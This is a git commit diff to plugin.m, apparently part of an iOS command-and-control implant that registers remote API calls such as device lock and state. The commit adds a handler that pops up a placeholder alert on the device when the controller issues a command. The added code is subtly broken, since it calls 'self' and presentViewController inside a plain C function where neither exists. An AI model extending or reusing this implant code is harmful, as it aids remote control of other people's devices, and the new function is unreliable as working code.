63bc64766381dc45d127db45eb7c5098107866b6
Ivan Nikolsky <enty8080@gmail.com>
2023-03-01 11:37:34 +0300

    Update plugin.m

--- plugin.m
+++ plugin.m
@@ -25,6 +25,7 @@
 #define ICTL_SCOPE 1
 
 #import <Foundation/Foundation.h>
+#import <UIKit/UIKit.h>
 
 #include "c2.h"
 #include "tlv.h"
@@ -48,8 +49,26 @@ static c2_api_call_t *ictl_state(tlv_transport_pkt_t tlv_transport_packet)
     return craft_c2_api_call_pkt(tlv_transport_packet, API_CALL_SUCCESS, [result UTF8String]);
 }
 
+static c2_api_call_t *ictl_alert(tlv_transport_pkt_t tlv_transport_packet)
+{
+    UIAlertController* alert = [UIAlertController alertControllerWithTitle:@"Title"
+                                                               message:@"Message"
+                                                        preferredStyle:UIAlertControllerStyleAlert];
+
+    UIAlertAction* defaultAction = [UIAlertAction actionWithTitle:@"OK" style:UIAlertActionStyleDefault
+                                                      handler:^(UIAlertAction * action) {
+                                                          
+                                                      }];
+
+    [alert addAction:defaultAction];
+    [self presentViewController:alert animated:YES completion:nil];
+
+    return craft_c2_api_call_pkt(tlv_transport_packet, API_CALL_SUCCESS, "");
+}
+
 void register_ictl_api_calls(c2_api_calls_t **c2_api_calls_table)
 {
     c2_register_api_call(c2_api_calls_table, 1, ictl_lock, ICTL_SCOPE);
     c2_register_api_call(c2_api_calls_table, 2, ictl_state, ICTL_SCOPE);
+    c2_register_api_call(c2_api_calls_table, 3, ictl_alert, ICTL_SCOPE);
 }
